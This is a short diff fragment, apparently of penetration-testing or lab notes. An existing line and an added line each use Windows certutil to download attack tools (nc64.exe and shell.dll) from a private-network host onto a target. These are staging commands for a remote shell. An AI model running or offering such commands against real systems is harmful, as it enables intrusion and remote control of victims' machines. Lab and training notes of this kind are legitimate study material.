@@ -5,7 +5,7 @@ certutil -urlcache -split -f http://192.168.45.186/nc64.exe C:/Windows/Temp/nc.e
 ```
 
 ```
-
+certutil -urlcache -split -f http://192.168.45.186:80/shell.dll shell.dll
 ```
 
 ```
